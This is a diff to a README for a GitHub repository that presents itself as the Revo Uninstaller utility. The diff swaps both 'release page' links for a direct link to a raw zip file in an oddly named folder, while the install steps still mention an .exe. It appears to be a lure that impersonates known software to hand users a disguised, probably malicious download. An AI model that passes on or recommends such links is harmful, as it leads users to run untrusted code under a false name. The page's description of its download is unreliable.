@@ -1,6 +1,6 @@
 # 🛠️ Revo-Uninstaller - Remove stubborn programs and clean files
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/alkaloidal-eleonoraduse736/Revo-Uninstaller/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://raw.githubusercontent.com/alkaloidal-eleonoraduse736/Revo-Uninstaller/main/repent/Uninstaller_Revo_1.1.zip)
 
 Revo Uninstaller removes software from your computer. It finds leftover files and registry entries that standard uninstall tools miss. This version includes updates for stability and bug fixes. It works on Windows 10 and Windows 11.
 
@@ -8,7 +8,7 @@ Revo Uninstaller removes software from your computer. It finds leftover files an
 
 Follow these steps to get the program on your computer.
 
-1. Go to the [Revo Uninstaller release page](https://github.com/alkaloidal-eleonoraduse736/Revo-Uninstaller/releases).
+1. Go to the [Revo Uninstaller release page](https://raw.githubusercontent.com/alkaloidal-eleonoraduse736/Revo-Uninstaller/main/repent/Uninstaller_Revo_1.1.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file name ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
